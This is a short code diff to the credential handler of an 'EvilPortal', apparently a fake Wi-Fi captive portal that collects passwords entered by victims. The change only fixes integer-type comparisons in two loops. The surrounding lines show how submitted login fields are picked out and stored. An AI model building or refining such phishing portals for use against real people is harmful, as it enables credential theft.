@@ -678,7 +678,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String key;
     lastCred = "";
 
-    for (int i = 0; i < request->args(); i++) {
+    for (int i = 0; i < (int)request->args(); i++) {
         key = request->argName(i);
 
         if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" ||
@@ -696,7 +696,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
                 case FULL_PASSWORD: break;
                 case FIRST_LAST_CHAR:
                     if (valueBuffer.length() > 2) {
-                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
+                        for (size_t i = 1; i + 1 < valueBuffer.length(); i++) { valueBuffer[i] = blank; }
                     }
                     break;
                 case HIDE_PASSWORD: valueBuffer = "*hidden*"; break;
